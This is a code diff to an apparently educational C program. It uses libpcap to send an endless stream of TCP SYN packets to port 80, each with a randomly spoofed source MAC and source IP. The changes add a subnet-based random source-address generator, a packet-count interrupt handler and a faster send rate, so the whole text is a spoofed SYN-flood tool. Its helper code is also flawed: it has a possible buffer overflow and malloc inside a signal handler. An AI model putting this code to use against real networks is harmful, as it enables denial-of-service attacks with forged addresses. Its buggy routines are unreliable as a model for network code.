@@ -12,7 +12,8 @@
 #include <netinet/in.h>         // for struct in_addr
 #include <sys/socket.h>         // for AF_INET, AF_INET6
 #include <openssl/rand.h>       // for RAND_bytes
-#include <time.h>
+#include <time.h>               // for rand()
+#include <signal.h>             // for signal handling
 #include "packets.h"
 #include "transfer.h"
 
@@ -21,6 +22,23 @@
 typedef struct ether_header ETH_Header_t;
 typedef struct ether_addr ETH_ADDR;
 typedef unsigned char byte;
+
+size_t total_sent = 0;
+
+void signal_handler() {
+    sigset_t mask, prev;
+    sigemptyset(&mask);
+    sigfillset(&mask); // Fill set with all signals
+
+    sigprocmask(SIG_BLOCK, &mask, &prev); // Block incoming signals
+    size_t len = snprintf(NULL, 0, "\n(%zu packets sent)\n", total_sent);
+    char *msg = (char *) malloc(len + 2); // Add 2 for newline and null terminator
+    snprintf(msg, len + 2, "\n(%zu packets sent)\n\n", total_sent); // Include newline
+    write(STDOUT_FILENO, msg, strlen(msg));
+    sigprocmask(SIG_SETMASK, &prev, NULL); // Unblock signals
+    exit(EXIT_SUCCESS);
+}
+
 
 void parseArgs(int argc, char **argv){
     if(argc != 5){
@@ -56,6 +74,38 @@ void set_ether_type(ETH_Header_t *eth, uint16_t type){
     eth->ether_type = htons(type);
 }
 
+uint32_t random_ip(const char *subnet){ 
+    if(strlen(subnet) < 10 || strlen(subnet) > 18){ 
+        fprintf(stderr, "Invalid subnet\n");
+        exit(EXIT_FAILURE);
+    }
+    char ip_str[16];
+    char mask_str[3];
+    int curr;
+    for(curr = 0; subnet[curr] != '/'; curr ++){
+        ip_str[curr] = subnet[curr];
+    }
+    ip_str[curr] = '\0';
+    int i;
+    for(i = 0; subnet[curr + 1] != '\0'; i ++){
+        mask_str[i] = subnet[curr + 1];
+        curr ++;
+    }
+    mask_str[i] = '\0';
+    struct in_addr ip_dst;
+    ip_dst.s_addr = inet_addr(ip_str);
+    uint32_t ip = ntohl(ip_dst.s_addr);
+    uint32_t mask = atoi(mask_str);
+    uint32_t rand_int = 0;
+    size_t len_rand = sizeof(uint32_t);
+    byte *rand_bytes = (byte *) malloc(len_rand);
+    RAND_bytes(rand_bytes, len_rand);
+    memcpy(((unsigned char *) &rand_int), rand_bytes, len_rand);
+    uint32_t result = (rand_int >> mask) | ip;
+    free(rand_bytes);
+    return result;
+}
+
 uint32_t randomize_ipA(){
     uint32_t result = 0xa;
     uint32_t rand_int = 0;
@@ -88,6 +138,12 @@ byte *random_mac_src(){
 
 
 int main(int argc, char **argv) {
+    struct sigaction action;  
+    action.sa_handler = &signal_handler; //providing location of signal_handler
+    sigemptyset(&action.sa_mask);
+    action.sa_flags = SA_RESTART; //setting appropriate flags
+    sigaction(SIGINT, &action, NULL);
+
     char dev[IFNAMSIZ], errbuf[PCAP_ERRBUF_SIZE];
     char server_ip[INET_ADDRSTRLEN];
     pcap_t *handle;
@@ -106,7 +162,7 @@ int main(int argc, char **argv) {
     ETH_Header_t *eth_frame = (ETH_Header_t *) malloc(eth_len);
 
     /* Set ethernet header parameters*/
-    const char *ether_dhost = "11:22:33:44:55:66";
+    const char *ether_dhost = "b8:27:eb:c3:93:a7";
     ETH_ADDR *dhost = ether_aton(ether_dhost);
     set_ether_shost(eth_frame, random_mac_src());
     set_ether_dhost(eth_frame, dhost->octet);
@@ -129,40 +185,40 @@ int main(int argc, char **argv) {
     size_t total_len = eth_len + ipH_len + tcpH_len;
     byte *packet = (byte *) malloc(total_len);
 
-    size_t total_sent = 0;
     size_t line_limit = 20;
+    const char *subnet = "192.168.1.24/16";
     /* insecure random seed */
     srand(time(NULL));
 
-        IP_set_version(ip_frame, 0x4);
-        IP_set_IHL(ip_frame, 0x5);
-        IP_set_type_of_service(ip_frame, 0x00);
-        IP_set_total_length(ip_frame, (uint16_t) total_len - eth_len);
-        IP_set_id(ip_frame, 0xabcd);
-        IP_set_flags(ip_frame, 0x0);
-        IP_set_offset(ip_frame, 0x0);
-        IP_set_time_to_live(ip_frame, 0x40);
-        IP_set_protocol(ip_frame, 0x06);
-        IP_set_src_address(ip_frame, randomize_ipA()); /* placeholder */
-        IP_set_dst_address(ip_frame, htonl(ip_dst.s_addr));
-        IP_update_checksum(ip_frame);
+    IP_set_version(ip_frame, 0x4);
+    IP_set_IHL(ip_frame, 0x5);
+    IP_set_type_of_service(ip_frame, 0x00);
+    IP_set_total_length(ip_frame, (uint16_t) total_len - eth_len);
+    IP_set_id(ip_frame, 0xabcd);
+    IP_set_flags(ip_frame, 0x0);
+    IP_set_offset(ip_frame, 0x0);
+    IP_set_time_to_live(ip_frame, 0x40);
+    IP_set_protocol(ip_frame, 0x06);
+    IP_set_src_address(ip_frame, random_ip(subnet));
+    IP_set_dst_address(ip_frame, htonl(ip_dst.s_addr));
+    IP_update_checksum(ip_frame);
 
-        /* Set tcp parameters */
-        TCP_set_src_port(tcp_header, 0x1234);
-        TCP_set_dst_port(tcp_header, 0x50);
-        TCP_set_sequence_num(tcp_header, (uint32_t) rand()); /* random sequence number 0-100 */
-        TCP_set_ack_num(tcp_header, 0x0);
-        TCP_set_offset(tcp_header, 0x5);
-        TCP_set_reserved(tcp_header, 0x0);
-        TCP_set_control_bits(tcp_header, 0x2);
-        TCP_set_window(tcp_header, 0x7110);
-        TCP_set_ugent_ptr(tcp_header, 0x0);
-        TCP_update_checksum(tcp_header, ip_frame);
+    /* Set tcp parameters */
+    TCP_set_src_port(tcp_header, 0x1234);
+    TCP_set_dst_port(tcp_header, 0x50);
+    TCP_set_sequence_num(tcp_header, (uint32_t) rand()); /* random sequence number 0-100 */
+    TCP_set_ack_num(tcp_header, 0x0);
+    TCP_set_offset(tcp_header, 0x5);
+    TCP_set_reserved(tcp_header, 0x0);
+    TCP_set_control_bits(tcp_header, 0x2);
+    TCP_set_window(tcp_header, 0x7110);
+    TCP_set_ugent_ptr(tcp_header, 0x0);
+    TCP_update_checksum(tcp_header, ip_frame);
 
     while(1){
         /* Updating variable values */
         set_ether_shost(eth_frame, random_mac_src());
-        IP_set_src_address(ip_frame, randomize_ipC());
+        IP_set_src_address(ip_frame, random_ip(subnet));
         IP_update_checksum(ip_frame);
         TCP_update_checksum(tcp_header, ip_frame);
 
@@ -189,7 +245,7 @@ int main(int argc, char **argv) {
                 fprintf(stdout, ".");
                 fflush(stdout);
             }
-            sleep(1);
+            usleep(500000); /* in microseconds */
         }
     }
     
